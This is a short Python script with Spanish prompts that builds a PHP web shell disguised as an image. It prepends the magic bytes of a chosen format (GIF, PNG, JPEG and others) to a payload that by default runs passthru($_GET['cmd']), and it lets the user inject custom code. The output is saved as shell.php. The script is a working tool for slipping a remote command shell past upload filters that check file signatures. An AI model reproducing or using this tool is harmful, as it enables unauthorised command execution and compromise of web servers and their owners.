#!/usr/bin/env python3.5
import os
import getpass

user = getpass.getuser()
bmp = "\x42\x4D"
gif = "\x47\x49\x46\x38\x37\x61"
png = "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A"
jpeg = "\xFF\xD8\xFF\xE0"
jpg = "\xFF\xD8\xFF\xE1"
psd = "\x38\x42\x50\x53"
ico = "\x00\x00\x01\x00"
code = "passthru($_GET['cmd']);"
type = ""

print("\033[1;31m" + "¿Que tipo de imagen deseas fingir?:")
print("\033[37m" + "BMP(0)\nGIF(1)\nPNG(2)\nJPEG(3)\nJPG(4)\nPSD(5)\nICO(6)\n")
choice = input("\033[1;32m" + "> " + "\033[1;37m")

if choice == '0':
    type = bmp
elif choice == '1':
    type = gif
elif choice == '2':
    type = png
elif choice == '3':
    type = jpeg
elif choice == '4':
    type = jpg
elif choice == '5':
    type = psd
else:
    type = ico

print("\033[1;31m" + "\nEl codigo por defecto es: " + code)
print("¿Quieres inyectar tu propio codigo?:")
print("\033[37m" + "NO(0)\nSI(1)\n")
choice = input("\033[1;32m" + "> ")

if choice == '1':
    print("Ingresa tu codigo(usa comillas simples):")
    code = input("> " + "\033[1;37m")

def createArchive():
    path = "/home/" + user + "/Documentos/"
    f = open(path + "shell.php", "w")
    f.write(type + "<?\n" + code + "\n?>\n")
    f.close()
    print("\033[1;31m" + "\nTu archivo se guardo en: " + path)

def viewArchive():
    print("\033[1;36m")
    os.system("cat /home/" + user + "/Documentos/shell.php")

createArchive()
viewArchive()
